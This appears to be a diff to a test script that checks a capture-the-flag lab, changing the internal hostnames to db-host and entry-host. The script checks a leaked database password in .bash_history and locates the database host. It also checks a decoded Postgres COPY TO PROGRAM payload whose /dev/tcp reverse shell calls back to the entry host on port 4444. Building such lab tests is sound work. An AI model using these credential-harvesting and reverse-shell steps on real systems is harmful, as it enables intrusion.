@@ -36,8 +36,10 @@ ap "grep -o 'psql -h.*' ~/.bash_history" | grep -q 'devpass123' \
 ok 2 ".bash_history leaks appuser/devpass123 with a masked host"
 
 # 3. recon: find the database on the internal subnet.
-DBIP="$(ap 'getent hosts db | awk "{print \$1}"' | head -1)"
-[ -n "$DBIP" ] || die "database 'db' not resolvable from the entry host"
+# (The instancer gives no service-name aliases; Docker's embedded DNS resolves
+# the manifest's `Hostname` values, `entry-host`/`db-host`.)
+DBIP="$(ap 'getent hosts db-host | awk "{print \$1}"' | head -1)"
+[ -n "$DBIP" ] || die "db-host not resolvable from the entry host"
 ok 3 "database found at $DBIP:5432 on the internal network"
 
 # 4. psql: tables + the bait note.
@@ -54,7 +56,7 @@ PAYLOAD="$(docker exec "$CONTAINER" bash -c "printf '%s' '$B64' | base64 -d")"
 # The payload must point the reverse shell back at the *entry* host (where the
 # player will listen), not at the db.
 LISTEN="$(printf '%s' "$PAYLOAD" | grep -oE '/dev/tcp/[0-9.]+/4444' | cut -d/ -f4)"
-ENTRY_IP="$(ap 'getent hosts entry | awk "{print \$1}"' | head -1)"
+ENTRY_IP="$(ap 'getent hosts entry-host | awk "{print \$1}"' | head -1)"
 [ "$LISTEN" = "$ENTRY_IP" ] \
   || die "payload targets the wrong listener ($LISTEN, want $ENTRY_IP): $PAYLOAD"
 ok 5 "decoded COPY TO PROGRAM payload (listener = $ENTRY_IP:4444)"
